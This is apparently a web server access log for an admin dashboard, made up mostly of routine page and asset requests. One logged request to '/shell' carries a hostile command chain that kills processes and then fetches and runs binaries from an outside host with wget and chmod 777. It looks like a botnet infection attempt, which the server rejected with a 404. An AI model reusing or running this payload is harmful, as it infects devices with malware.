Server is running on port:  \\.\pipe\35645722-f7a2-4299-b2e3-710384c85b4b
[0mGET /robots.txt [33m404[0m 40.752 ms - 149[0m
[0mGET / [32m200[0m 43.053 ms - 31962[0m
[0mGET / [32m200[0m 18.253 ms - 31962[0m
[0mPOST / [33m404[0m 50.785 ms - 140[0m
[0mGET / [32m200[0m 14.596 ms - 31962[0m
[0mGET / [32m200[0m 14.028 ms - 31962[0m
[0mGET / [32m200[0m 13.158 ms - 31962[0m
[0mGET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws [33m404[0m 4.031 ms - 144[0m
[0mGET / [32m200[0m 12.888 ms - 31962[0m
[0mGET / [32m200[0m 11.255 ms - 31962[0m
[0mGET /admin/login [32m200[0m 8.534 ms - 1464[0m
[0mGET /assets/index-BISASkG-.css [32m200[0m 3.399 ms - 1817237[0m
[0mGET /assets/index-COGDgJVX.js [32m200[0m 9.766 ms - 10066996[0m
[0mGET /admin/staff-detail [32m200[0m 24.892 ms - 48[0m
[0mGET /admin/count [32m200[0m 31.434 ms - 48[0m
[0mGET /assets/DountApexChart-DzRVNEmi.js [32m200[0m 5.803 ms - 670[0m
[0mGET /assets/tdo-logo-white-2-WwjSyhGE.png [32m200[0m 6.096 ms - 68615[0m
[0mGET /assets/SalesApexChart1-_Vaa40-E.js [32m200[0m 8.377 ms - 1234[0m
[0mGET /assets/fa-solid-900-DByUvYfa.woff2 [32m200[0m 2.692 ms - 126828[0m
[0mGET /assets/la-solid-900-TjMEgv3Q.woff2 [32m200[0m 2.376 ms - 96752[0m
[0mGET /assets/TicketsLineApex-BcPXkoXZ.js [32m200[0m 2.494 ms - 1235[0m
[0mGET /assets/SalesCanvas-DEK2dOnQ.js [32m200[0m 4.898 ms - 761[0m
